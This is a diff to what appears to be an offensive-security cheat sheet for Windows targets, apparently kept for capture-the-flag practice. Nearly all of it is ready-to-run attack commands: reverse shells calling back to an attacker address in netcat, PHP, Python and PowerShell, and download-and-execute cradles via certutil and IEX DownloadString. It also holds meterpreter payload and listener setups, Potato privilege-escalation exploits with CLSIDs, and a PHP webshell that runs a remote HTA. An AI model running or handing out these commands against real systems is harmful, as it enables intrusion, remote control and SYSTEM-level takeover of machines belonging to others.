@@ -861,7 +861,11 @@ reset
 [*] File Transfer
 +---------- My Files ----------+
 nc.exe
+Invoke-PowerShellTcp.ps1
 EfsPotato.exe
+SigmaPotato.exe
+jp32.exe
+
 
 +---------- To Disk ----------+
 wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
@@ -870,21 +874,6 @@ certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
 certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe
 
 [*] Shells
-+---------- Get Architecture (x86 / x64) ----------+
-wmic os get osarchitecture
-
-+---------- In Memory ----------+
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
-
-
-+---------- Listeners ----------+
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
-rlwrap nc -lvnp 5555
-rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 2; set payload windows/x64/meterpreter/reverse_tcp; run"
-
 +---------- MSFVenom ----------+
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o 0.exe
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o 0.msi
@@ -893,43 +882,56 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -
 msfvenom -p php/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.php
 msfvenom -p python/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.py
 
-+---------- Reverse Shells ----------+
-nc.exe $MYIP 5555 -e cmd.exe
++---------- One Line Reverse Shells ----------+
 php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
 powershell -nop -c "$AtpsZlvw99=New-Object System.Net.Sockets.TCPClient('$MYIP',5555);$DqvVumCJ99=$AtpsZlvw99.GetStream();[byte[]]$bytes=0..65535|ForEach-Object{0};while(($i=$DqvVumCJ99.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$fjVAQFpJ99=(Invoke-Expression $data 2>&1|Out-String);$vpVmHTLx99=$fjVAQFpJ99+'PS '+(Get-Location).Path+'> ';$BaZSdidm99=[System.Text.Encoding]::ASCII.GetBytes($vpVmHTLx99);$DqvVumCJ99.Write($BaZSdidm99,0,$BaZSdidm99.Length);$DqvVumCJ99.Flush()};$AtpsZlvw99.Close()"
 powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
 
-+---------- Other Memory ----------+
-powershell -c "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://$MYIP:8888/windows/nc.exe')"
-powershell -c "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://$MYIP:8888/windows/EfsPotato.exe')"
-powershell -c "[EfsPotato]::Main(@('C:\programdata\nc.exe','$MYIP','5555','-e','cmd'))"
-
 [*] Privilege Escalation
 +---------- Initial Checks ----------+
 powershell -c "whoami /user /priv"
 powershell -c "cd \users; tree /a /f"
+powershell -c "wmic os get osarchitecture"
 
 +---------- Installed Apps ----------+
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 
-+---------- Services and Unquoted Paths ----------+
++---------- Services / Unquoted Paths ----------+
 powershell -c "Get-Service | Where-Object { $_.CanStop -eq $true -and $_.DisplayName -notmatch 'Microsoft|Windows' } | Sort-Object DisplayName"
-wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
+powershell -c "wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows'"
 
 +---------- Scheduled Tasks ----------+
 powershell -c "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Microsoft') -and ($_.TaskPath -notmatch 'Microsoft')} | Select-Object TaskName, TaskPath, State, Author"
 powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
-echo 'type C:\Users\Administrator\Desktop\root.txt > C:\Windows\win.log' > C:\Windows\SYSTEM.ps1
-Start-ScheduledTask -TaskName "Ownership"
+powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
 
-+---------- Reverse Shells ----------+
++---------- Shell From File ----------+
+rlwrap -lvnp 5555
 C:\programdata\nc.exe $MYIP 5555 -e cmd.exe
+
++---------- Shell From Memory ----------+
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse $MYIP -Port 5555"
+
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
+
++---------- Potatos (SeImpersonatePrivilege) ----------+
+C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5555 -e cmd\"" -z
 C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5555 -e cmd"
-C:\programdata\FullPowers.exe -z -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5555 -e cmd\""
-C:\programdata\SigmaPotato.exe --revshell $MYIP 5555
-echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
-echo -e 'import os\nos.popen("wget -qO /dev/shm/iZGYpy3w --no-check-certificate http://$MYIP:8080/11jUSgyiO5We7; chmod 777 /dev/shm/iZGYpy3w; /dev/shm/iZGYpy3w& disown")' > test.py
+C:\programdata\SigmaPotato.exe "C:\programdata\nc.exe $MYIP 5555 -e cmd"
+C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe $MYIP 5678 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
+https://ohpe.it/juicy-potato/CLSID/
+Windows Server 2008     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
+Windows Server 2012     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
+Windows Server 2016     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
+Windows 7               {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
+Windows 8.1             {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
+Windows 10 Enterprise   {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
+Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
+
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 
 +---------- File Permissions ----------+
 powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
